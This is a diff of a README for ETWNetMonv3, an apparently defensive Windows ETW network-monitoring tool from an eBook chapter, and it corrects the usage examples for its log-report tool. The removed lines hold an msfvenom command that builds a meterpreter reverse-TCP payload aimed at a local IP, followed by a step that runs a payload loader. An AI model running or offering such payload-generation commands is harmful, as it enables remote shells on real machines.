@@ -32,23 +32,26 @@ Note; this code was for (eBook Chapter-15), so i will publish pdf file for Part1
  -----------------------------------------------------------      
   
   3. ETWNetMon3Log.cs (Command base tool for make XML/HTML report via "Queries" from ETW Log file EtwNetMonv3logs.txt)
+  
+  Note: this file with ETWNetMonv3Agent.exe should be in the same folder (both work with log file EtwNetMonv3logs.txt)
  
  usage: 
     
-    step1: [linux] msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f c > payload.txt
-    step2: [win] NativePayload_ImageGetDigestStream.exe  [payload...]
-    example: ETWNetMonv3Log.exe "fc,48,00,87,00,...."
-    syntax  1: switch XML, All ETW records from text [EtwNetMonv3logs.txt] will save to xml file (convert all records to xml)");
-    example 1: ETWNetMonv3Log.exe xml filename.xml ");
-    example 2: ETWNetMonv3Log.exe html "rport >=80 OR events LIKE '*Established*' AND events LIKE '*connect complete*'\"");
-    example 2: ETWNetMonv3Log.exe html "events LIKE '*requested to connect*'\"");
-    example 2: ETWNetMonv3Log.exe html "state LIKE '*synsent*'\"");
-    example 2: ETWNetMonv3Log.exe html "events LIKE '*'\"");
-    example 2: ETWNetMonv3Log.exe html "rhost LIKE '192.168*' or lhost LIKE '192.168.1*'\"");
-    example 2: ETWNetMonv3Log.exe html "rport <=80 OR lport >=50000\"");
-    example 2: ETWNetMonv3Log.exe html "pname LIKE '*.exe*'\"");
-    example 2: ETWNetMonv3Log.exe html "events LIKE '*C:\\*'\"");
+    step1: [win] ETWNetMonv3Log.exe  [XML xmlfile.xml] [HTML "YOUTR QUERY"]
+    example: ETWNetMonv3Log.exe HTML "state LIKE '*synsent*'"
+    syntax  1: switch XML, All ETW records from text [EtwNetMonv3logs.txt] will save to xml file (convert all records to xml)
+    example 1: ETWNetMonv3Log.exe XML filename.xml
+    syntax  2: ETWNetMonv3Log.exe HTML "your query"
+    example 2: ETWNetMonv3Log.exe html "rport >=80 OR events LIKE '*Established*' AND events LIKE '*connect complete*'"
+    example 2: ETWNetMonv3Log.exe html "events LIKE '*requested to connect*'"
+    example 2: ETWNetMonv3Log.exe html "state LIKE '*synsent*'"
+    example 2: ETWNetMonv3Log.exe html "events LIKE '*'"
+    example 2: ETWNetMonv3Log.exe html "rhost LIKE '192.168*' or lhost LIKE '192.168.1*'"
+    example 2: ETWNetMonv3Log.exe html "rport <=80 OR lport >=50000"
+    example 2: ETWNetMonv3Log.exe html "pname LIKE '*.exe*'"
+    example 2: ETWNetMonv3Log.exe html "events LIKE '*C:\\*'"
     example 2: ETWNetMonv3Log.exe html "PID = 1452"
+    
    ![](https://github.com/DamonMohammadbagher/ETWNetMonv3/blob/main/Pic/ETWNetMonv3_01.png)
 
  -----------------------------------------------------------    
